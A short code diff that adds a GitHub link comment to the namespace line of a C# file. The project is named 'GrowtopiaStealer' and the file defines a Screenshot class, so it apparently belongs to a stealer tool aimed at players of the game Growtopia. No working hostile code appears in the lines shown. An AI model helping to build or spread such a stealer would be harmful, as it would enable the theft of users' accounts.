@@ -2,7 +2,7 @@
 using System.Drawing;
 using System.Windows.Forms;
 
-namespace GrowtopiaStealer
+namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
 {
     class Screenshot
     {
